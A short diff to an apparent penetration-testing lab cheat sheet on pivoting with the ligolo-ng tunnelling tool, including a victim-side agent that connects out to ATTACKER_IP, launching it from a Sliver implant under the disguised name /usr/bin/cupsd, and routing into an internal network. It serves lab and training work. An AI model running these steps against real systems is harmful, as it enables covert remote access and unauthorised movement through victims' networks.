@@ -6,18 +6,20 @@
 ### Quick Copy Paste&#x20;
 
 ```
-# proxy setup on attacker machine
-./proxy -selfcert -laddr https://0.0.0.0:1080
+# proxy setup on attacker machine (use http:// if https causes issues)
+./proxy -selfcert -laddr http://0.0.0.0:1080
 WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
 INFO[0000] Listening on 0.0.0.0:1080
-# agent from victim machine
+# agent from victim machine (use http:// to match proxy protocol)
+./agent_linux_amd64.elf -connect http://ATTACKER_IP:1080 -ignore-cert
 - from sliver 
 execute /usr/bin/cupsd "-connect 10.10.14.2:1080 -ignore-cert"
 ligolo-ng » INFO[0672] Agent joined.                                 name=root@DANTE-WEB-NIX01 remote="10.10.110.100:58358"
 # from attacker machine ligolo-ng cmd
 session 
 - choose session 
-auto_route
+autoroute
+# select routes to add, creates interface and starts tunnel
 - verify 
 curl http://172.16.1.1
 ```
